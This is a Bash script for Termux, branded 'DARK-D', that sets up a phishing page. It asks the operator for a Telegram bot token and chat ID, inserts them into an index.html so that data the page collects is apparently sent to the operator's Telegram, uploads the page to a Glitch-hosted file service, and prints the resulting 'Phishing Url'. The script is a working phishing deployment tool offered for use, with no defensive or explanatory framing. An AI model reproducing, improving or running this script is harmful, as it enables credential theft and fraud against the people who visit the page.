#!/bin/bash
clear
# dark color
r='\033[1;91m'
p='\033[1;95m'
y='\033[1;93m'
g='\033[1;92m'
n='\033[1;0m'
b='\033[1;94m'
c='\033[1;96m'
C='\033[1;92m[\033[1;00m</>\033[1;92m]\033[0m'
D='\033[1;92m[\033[1;00m〄\033[1;92m]\033[0m'
E='\033[1;92m[\033[1;00m×\033[1;92m]\033[0m'
A='\033[1;92m[\033[1;00m+\033[1;92m]\033[0m'
lm='\033[96m▱▱▱▱▱▱▱▱▱▱▱▱\033[0m〄\033[96m▱▱▱▱▱▱▱▱▱▱▱▱\033[1;00m'
dm='\033[93m▱▱▱▱▱▱▱▱▱▱▱▱\033[0m〄\033[93m▱▱▱▱▱▱▱▱▱▱▱▱\033[1;00m'


if command -v curl &>/dev/null; then
    echo ""
else
    pkg install curl -y >/dev/null 2>&1
fi
clear

dxnetcheck() {
clear
echo
echo -e "               ${g}╔═══════════════╗"
echo -e "               ${g}║ ${n}</>  ${c}DARK-D${g}   ║"
echo -e "               ${g}╚═══════════════╝"
echo -e "  ${g}╔════════════════════════════════════════════╗"
echo -e "  ${g}║  ${C} ${y}Checking Your Internet Connection¡${g}  ║"
echo -e "  ${g}╚════════════════════════════════════════════╝${n}"
while true; do
    curl --silent --head --fail https://github.com > /dev/null
    if [ "$?" != 0 ]; then
echo -e "              ${g}╔══════════════════╗"
echo -e "              ${g}║${C} ${r}No Internet ${g}║"
echo -e "              ${g}╚══════════════════╝"
        sleep 2.5
    else
        break
    fi
done
clear
}
dxnetcheck
echo
    echo ; echo -e "		        ${g}Hey ${y}Dear" ; echo -e "${c}              (\_/)" ; echo -e "              (${y}^ω^${c})     ${g}I'm DARK-D${c}" ; echo -e "             ⊂(___)づ  ⋅˚₊‧ ଳ ‧₊˚ ⋅"
    echo ; echo -e " ${A} ${c}Please Enter Your ${g}Telegram Bot token \n ${A} ${c}And Your ${g}Chat Id ${c}\n"

read -p "[+]─[Enter Token]──➤ " token
read -p "[+]─[Enter ID]──➤ " chat_id

# Define the index.html file
index_file="index.html"

# Use sed to replace the placeholders in the index.html file
sed -i "s/YOUR_BOT_TOKEN_HERE/$token/g" "$index_file"
sed -i "s/YOUR_CHAT_ID_HERE/$chat_id/g" "$index_file"
termux-reload-settings
echo -e "\n ${A} ${c}Token and ID have been updated\n"
if [[ -f "$index_file" && "$index_file" == *.html ]]; then
    response=$(curl -s -F "file=@$index_file" https://codex-host.glitch.me/upload)

    file_url=$(echo "$response" | jq -r '.fileUrl')
    echo -e "\n ${A} ${y}Note & Save the URL given here. \n ${A} ${y}You can use the URL ${g}permanently \n" ; echo -e "\n ${D} ${c}Your Phishing Url: ${g}${file_url}\n${c}"
        read -p "[+]─[Enter to back]──➤ "
else
    echo -e "\n ${E} ${r}File does not exist or is not an ${g}HTML file.\n"
fi
